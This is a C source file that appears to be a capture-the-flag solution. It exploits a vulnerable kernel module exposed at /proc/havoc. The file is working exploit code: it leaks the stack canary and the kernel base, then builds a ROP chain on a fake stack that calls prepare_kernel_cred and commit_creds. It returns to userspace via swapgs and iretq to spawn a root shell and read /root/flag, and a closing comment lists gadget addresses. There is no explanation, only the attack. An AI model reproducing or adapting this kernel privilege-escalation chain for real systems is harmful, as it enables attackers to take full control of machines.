#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/mman.h>
#include <signal.h>
int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);
void escalate_privs() //{ commit_creds(prepare_kernel_cred(0));}
{
	asm(
	".intel_syntax noprefix\n"
	"pop rdx\n"
	"mov rdi, 0\n"
	"call rdx\n"
	"mov rdi, rax\n"
	"pop rdx\n"
	"call rdx\n"
	".att_syntax\n"
	"ret\n");
		
}
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
}
void shell(void) {
	puts("Returned to userspace!");
	if(!getuid())
	{
		puts("Got r00t :)");
		system("/bin/cat /root/flag");
	}
	exit(0);
}
int main(){
	char *buf = calloc(100,sizeof(char));
	int fd = open("/proc/havoc",O_RDWR);
	buf[0] = 'A';
	signal(SIGSEGV,shell);
	char *inpbuf =(char*) calloc(100,sizeof(char));
	read(fd,inpbuf,100);
	unsigned long int *ib=(unsigned long int*)(inpbuf+1);
	for(int i=0;i<=8;i+=1)
	{
		printf("%lx\n",ib[i]);
		
	}
	unsigned long canary = ib[0];
	unsigned long rbp = ib[2];
	unsigned long oldRIP = ib[3];
	unsigned long kernelbase = oldRIP - 3256081;	
	unsigned long poprdi = kernelbase+0x838d0;
	unsigned long movcr4rdi = kernelbase+0x1feb0;
	unsigned long iretq = kernelbase + 0x3625b;
	unsigned long swapgs = kernelbase + 0x6d8b4;
	unsigned long movrsprbp = kernelbase + 0x8383c;
	unsigned long poprdx = kernelbase + 0xea1b9;
	unsigned long movrdir8callrdx = kernelbase + 0xe0eca2;
	unsigned long callrdx = kernelbase + 0xc041b7;
	unsigned long movr8raxpoprbp = kernelbase + 0x8beee; 
	unsigned long poprbp = kernelbase + 0x3cb;
	prepare_kernel_cred = kernelbase + 0xb5b10;
	commit_creds = kernelbase+ 0xb5760;
	printf("[*] Kernel Base:%lx\n",kernelbase);
	printf("[*] commit_creds:%p\n",commit_creds);
	printf("[*] prepare_kernel_cred:%p\n",prepare_kernel_cred);
	printf("[*] escalate_privs:%p\n",escalate_privs);
	void *temp_stack;
	temp_stack = mmap((void*)0x30000000, 0x10000000, 7, 0x32|MAP_STACK|MAP_POPULATE|MAP_GROWSDOWN|MAP_ANON, -1, 0);
	ib[3] = (unsigned long) movrsprbp;
	unsigned long* mapped;
        mapped = (unsigned long*)mmap((void*)0x60800000, 0x10000000, 7,0x32|MAP_ANON , -1, 0);
	mapped = mapped+0x100000UL-64UL;
	printf("temporary stack for later return: %p\n",temp_stack);
	printf("fake stack address: %p\n",mapped);
	ib[2] = (unsigned long)mapped;
	mapped[0] = (unsigned long)mapped+0x1000;
	mapped[1] = poprdi;
	mapped[2] = 0;
	mapped[3] = (unsigned long) prepare_kernel_cred;
	mapped[4] = movr8raxpoprbp;
	mapped[5] = (unsigned long)mapped+0x1000;
	//mapped[6] = poprdx;
	mapped[6] = (unsigned long) commit_creds;
	//mapped[8] = movrdir8callrdx;
	mapped[7] = (unsigned long) swapgs;
	mapped[8] = (unsigned long)(temp_stack+0x5000000+0x100);
	mapped[9] = iretq;
	mapped[10] = (unsigned long)shell;
	save_state();
	mapped[11] = user_cs;
	mapped[12] = user_rflags;
	mapped[13] = (unsigned long)(temp_stack+0x5000000);
	mapped[14] = user_ss;	
	puts("");
	void* payload = malloc(1000);
	memcpy(payload+1,ib,100);
	puts("Dumping Fake stack");
	for(int i=0;i<=16;i++)
		printf("%lx\n",mapped[i]);
	puts("Exploit?");
	write(fd,payload,70);
	puts("Returned to userspace!");
	system("/bin/sh");
}
/*
 * 0xffffffff8103625b: iretq; pop rbp; ret;
 * 0xffffffff8101feb0: mov cr4, rdi; pop rbp; ret;
 * 0xffffffff810838d0: pop rdi; ret;
 * 0xffffffff8106d8b4: swapgs; pop rbp; ret;
 * 0xffffffff8108383c: mov rsp, rbp; pop rbp; ret;
 * 0xffffffff8108beee : mov r8, rax ; mov rax, r8 ; pop rbp ; ret
 * 0xffffffff81e0eca2 : mov rdi, r8 ; call rdx
 * 0xffffffff810ea1b9 : pop rdx ; ret
 * 0xffffffff81c041b7 : call rdx
 * 0xffffffff810003cb : pop rbp ; ret
 */
